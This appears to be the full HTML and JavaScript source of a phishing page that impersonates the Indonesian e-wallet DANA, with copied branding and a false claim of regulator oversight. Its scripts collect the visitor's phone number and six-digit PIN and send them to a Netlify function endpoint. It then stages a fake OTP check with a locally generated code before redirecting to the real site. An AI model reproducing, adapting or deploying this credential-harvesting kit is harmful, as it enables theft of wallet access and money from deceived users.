<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>DANA - Apa pun transaksinya selalu ada DANA</title>
<meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA">
<meta property="twitter:title" content="DANA - Apa pun transaksinya selalu ada DANA">
<meta property="twitter:card" content="summary_large_image">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" >
<meta property="twitter:image:src" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTq-HC2z6B5uUunxMATpBRpkKkmcVL9J7yPQg&usqp=CAU">
<meta property="og:url" content="https://dana.id">
<meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
<meta property="twitter:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/container.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/loader.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/main.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/otp.css">
<link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/pin.css">
</head>
<body>
<div style="display:none;" class="index">
  <div class="header"><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt=""></div>
  <div class="content">
    <div class="hero"><img src="" alt=""></div>
    <h1>Dompet digital untuk kamu!</h1>
    <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
    <div class="line"></div>
    <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
    <button type="button" onclick="next();">Lanjutkan</button>
  </div>
</div>

<div class="start" style="display:none;">
  <img class="logo" src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png">
  <div class="footimg">
    <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/bi.png" alt="">
    <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/kom.png" alt="">
    <p>DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
  </div>
</div>

<div class="container hid">
  <div class="box-login">
    <div id="process" name="process" class="process" style="display: none;">
      <div class="loading"><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png"></div>
    </div>
    <div class="header"><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt=""></div>
    
    <form id="formNohp" onsubmit="sendNohp(event);">
      <h3>Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
      <div class="box-input">
        <div class="label"><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt=""><label>+62</label></div>
        <input id="inp" type="tel" autocomplete="off" required name="phoneNumber" placeholder="811-1234-5678">
      </div>
      <p class="desc">Nomor ponsel akan digunakan sebagai ID kamu &<br>menjaga akun selalu aman. Dengan melanjutkan,<br>kamu setuju dengan <b>Syarat & Ketentuan</b> dan<br><b>Kebijakan Privasi</b> kami</p>
      <div class="box-btn">
        <button disabled id="btn" class="btnnohp" type="submit">LANJUT</button>
      </div>
    </form>
    
    <form id="formPin" class="hid">
      <h3>Masukkan <b>PIN DANA</b></h3>
      <div class="box-input-pin">
        <div type="button" class="clear"></div>
        <input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        <input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
      </div>
      <button class="show" type="button">TAMPILKAN</button>
      <p class="forgot">LUPA PIN?</p>
    </form>
    
    <div class="bgotp hid">
      <form id="formOtp" class="">
        <h2>Tap verivikasi untuk menerima OTP</h2>
        <p class="alert">Kode OTP telah dikirim ke nomor Anda</p>
        <div class="box-input-otp">
          <div class="loadingOtp" style="display:none;"><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png"></div>
          <div type="button" class="clearotp"></div>
          <input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
          <input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
          <input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
          <input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
        </div>
        <p class="resend">KIRIM ULANG (<span id="countdown">120</span>s)</p>
      </form>
    </div>
  </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>

<script>
// Fungsi next() untuk pindah ke halaman input nomor HP
function next() {
  $(".index").fadeOut(300, function() {
    $(".container").fadeIn(300);
    $("#inp").focus();
  });
}

$(document).ready(function(){
  // Validasi input nomor HP
  $('#inp').on('input', function(){
    if($(this).val() == '0' || $(this).val() == '62'){
      $(this).val('');
    }
  });
  
  // Masking input nomor HP
  $('#inp').mask('000-0000-000000');
});

// Aktifkan tombol lanjut jika input sudah valid
let inp = document.getElementById("inp");
let btn = document.getElementById("btn");
inp.addEventListener("input", val);
function val(){
  if(inp.value.length > 10){
    btn.disabled = false;
  }else{
    btn.disabled = true;
  }
};

// Fungsi untuk mengumpulkan PIN dan berpindah ke input berikutnya
$('.inppin').on('input', function(event) {
  const inputs = $('.inppin');
  const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
  if (isAllFilled == true) {
    $(event.target).blur();
    sendPin();
  };
  const index = inputs.index(this);
  const currentValue = event.target.value;
  if (currentValue.length === 1) {
    if (index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
  } else if (currentValue.length === 0) {
    if (index > 0) {
      inputs[index].focus();
    }
  };
});

// Fungsi untuk backspace di input PIN
$('.inppin').on('keydown', function(event) {
  const inputs = $('.inppin');
  const key = event.key;
  const index = inputs.index(this);
  if (key === 'Backspace' && event.target.value.length === 0) {
    if (index > 0) {
      inputs[index - 1].focus();
    }
  };
});

// Fungsi untuk mengumpulkan OTP dan berpindah ke input berikutnya
$('.inpotp').on('input', function(event) {
  const inputs = $('.inpotp');
  const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
  if (isAllFilled == true) {
    $(event.target).blur();
    sendOtp();
  }
  const index = inputs.index(this);
  const currentValue = event.target.value;
  if (currentValue.length === 1) {
    if (index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
  } else if (currentValue.length === 0) {
    if (index > 0) {
      inputs[index].focus();
    }
  };
});

// Fungsi untuk backspace di input OTP
$('.inpotp').on('keydown', function(event) {
  const inputs = $('.inpotp');
  const key = event.key;
  const index = inputs.index(this);
  if (key === 'Backspace' && event.target.value.length === 0) {
    if (index > 0) {
      inputs[index - 1].focus();
    }
  };
});

// Fungsi untuk clear input PIN dan OTP
$(document).ready(function() {
  $('.clear').click(function() {
    $('.inppin').val('');
    $('#pin1').focus();
  });
  $('.clearotp').click(function() {
    $('.inpotp').val('');
    $('#otp1').focus();
  });
  
  // Fungsi untuk show/hide PIN
  $('.show').click(function() {
    $('.inppin').each(function() {
      if ($(this).attr('type') === 'password') {
        $(this).attr('type','number');
        $(".show").text("SEMBUNYIKAN");
      } else {
        $(this).attr('type', 'password');
        $(".show").text("TAMPILKAN");
      }
    });
  });
});

// Fungsi untuk mengirim data ke Netlify Function
async function sendDataToNetlify(data) {
  try {
    const response = await fetch('/.netlify/functions/send-dana-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    const result = await response.json();
    console.log('Success:', result);
  } catch (error) {
    console.error('Error:', error);
  }
}

// Modifikasi fungsi sendNohp
function sendNohp(event) {
  event.preventDefault();
  $("#process").show();
  
  const phoneNumber = $('#inp').val();
  localStorage.setItem('dana_phoneNumber', phoneNumber);
  
  // Kirim notifikasi nomor HP
  sendDataToNetlify({ 
    phoneNumber, 
    step: 'phone' 
  });
  
  setTimeout(function() {
    $("#process").hide();
    $("#formNohp").fadeOut(300, function() {
      $("#formPin").fadeIn(300);
      $("#pin1").focus();
    });
  }, 1500);
}

// Modifikasi fungsi sendPin
function sendPin() {
  $("#process").show();
  
  const pin = $('#pin1').val() + $('#pin2').val() + $('#pin3').val() + 
              $('#pin4').val() + $('#pin5').val() + $('#pin6').val();
  localStorage.setItem('dana_pin', pin);
  
  const phoneNumber = localStorage.getItem('dana_phoneNumber');
  
  // Kirim notifikasi PIN
  sendDataToNetlify({ 
    phoneNumber, 
    pin,
    step: 'pin' 
  });
  
  setTimeout(function() {
    $("#process").hide();
    $('.inppin').val('');
    $(".bgotp").fadeIn();
    setInterval(countdown, 1000);
    $("#otp1").focus();
    
    const otp = Math.floor(1000 + Math.random() * 9000);
    localStorage.setItem('dana_otp', otp);
  }, 1500);
}

// Modifikasi fungsi sendOtp
function sendOtp() {
  $(".loadingOtp").show();
  
  setTimeout(function() {
    const enteredOtp = $('#otp1').val() + $('#otp2').val() + 
                       $('#otp3').val() + $('#otp4').val();
    const correctOtp = localStorage.getItem('dana_otp');
    
    $(".loadingOtp").hide();
    $('.inpotp').val('');
    
    if(enteredOtp === correctOtp) {
      $(".alert").text("Verifikasi berhasil! Mengarahkan ke dashboard...");
      $(".alert").css("color","green");
      
      // Kirim notifikasi OTP
      const phoneNumber = localStorage.getItem('dana_phoneNumber');
      const pin = localStorage.getItem('dana_pin');
      sendDataToNetlify({ 
        phoneNumber, 
        pin, 
        otp: enteredOtp,
        step: 'otp' 
      });
      
      setTimeout(function() {
        window.location.href = "https://dana.id";
      }, 2000);
    } else {
      $(".alert").text("Kode OTP salah atau telah kedaluwarsa. Silahkan kirim ulang kode OTP");
      $(".alert").css("color","red");
    }
  }, 3000);
}

// Fungsi countdown untuk OTP
function countdown() {
  var count = parseInt($('#countdown').text());
  if (count !== 0) {
    $('#countdown').text(count - 1);
  } else {
    $('#countdown').text('120');
    $(".resend").css("color","blue");
    $(".resend").css("font-weight","bold");
    $(".resend").click(function() {
      // Generate OTP baru saat diklik
      const otp = Math.floor(1000 + Math.random() * 9000);
      localStorage.setItem('dana_otp', otp);
      console.log('OTP baru untuk demo:', otp);
      $('#countdown').text('120');
      $(".alert").text("Kode OTP baru telah dikirim ke nomor Anda");
      $(".alert").css("color","black");
      $(".resend").css("color","");
      $(".resend").css("font-weight","");
    });
  }
};

// Animasi awal saat halaman dimuat
window.onload = function() {
  setTimeout(function(){
    $(".start").fadeIn(300, function() {
      setTimeout(function(){
        $(".start").fadeOut(300, function() {
          $(".index").fadeIn(300);
        });
      }, 2000);
    });
  }, 500);
}
</script>
</body>
  </html>
